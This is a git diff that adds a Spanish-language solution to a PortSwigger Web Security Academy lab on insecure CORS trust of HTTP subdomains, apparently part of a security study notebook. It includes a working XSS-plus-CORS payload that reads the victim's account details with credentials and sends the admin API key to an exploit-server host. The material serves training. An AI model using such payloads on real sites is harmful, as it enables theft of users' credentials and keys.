@@ -95,3 +95,52 @@ Viendo los logs vemos que una petición al enviarle a la víctima que decodifica
 <figure><img src="../../.gitbook/assets/image (1522).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (1523).png" alt=""><figcaption></figcaption></figure>
+
+## Lab: CORS vulnerability with trusted insecure protocols
+
+### Enunciado
+
+Este sitio web tiene una configuración CORS insegura que confía en todos los subdominios sin importar el protocolo. Crea un código JavaScript que aproveche CORS para obtener la clave API del administrador y súbelo a tu servidor de explotación. El laboratorio se considerará resuelto cuando envíes correctamente la clave API del administrador.
+
+Puedes iniciar sesión en tu propia cuenta con las siguientes credenciales:
+
+* **Usuario:** `wiener`
+* **Contraseña:** `peter`
+
+### Resolución
+
+Nos logueamos y vemos la siguiente petición como en los anteriores laboratorios.
+
+<figure><img src="../../.gitbook/assets/image (1561).png" alt=""><figcaption></figcaption></figure>
+
+Ponemos un **Origin** aleatorio.
+
+<figure><img src="../../.gitbook/assets/image (1562).png" alt=""><figcaption></figcaption></figure>
+
+El encabezado de respuesta no refleja nuestro host en **Origin**. En el enunciado nos dice que este sitio web tiene una configuración CORS insegura, ya que confía en todos los subdominios sin importar el protocolo. Esto significa que el sitio tiene en su lista blanca un subdominio de confianza que usa HTTP sin cifrar.
+
+<figure><img src="../../.gitbook/assets/image (1563).png" alt=""><figcaption></figcaption></figure>
+
+Cuando hago clic en el botón **"Check stock"**, se abrió **otra ventana** que apunta a:
+
+```
+https://stock.0afb00e904f995b4802b03f200f60064.web-security-academy.net/?productId=1&storeId=1
+```
+
+Este es un **subdominio** de `0afb00e904f995b4802b03f200f60064.web-security-academy.net`. Además, **el parámetro `productId` es vulnerable a XSS.**
+
+<figure><img src="../../.gitbook/assets/image (1564).png" alt=""><figcaption></figcaption></figure>
+
+Sabiendo esto realizamos el siguiente script enviándoselo a la víctima.
+
+```
+<script>
+    document.location="http://stock.0afb00e904f995b4802b03f200f60064.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0afb00e904f995b4802b03f200f60064.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0aaa0009045f95fa805e02c9011c00c9.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```
+
+<figure><img src="../../.gitbook/assets/image (1565).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1566).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1567).png" alt=""><figcaption></figcaption></figure>
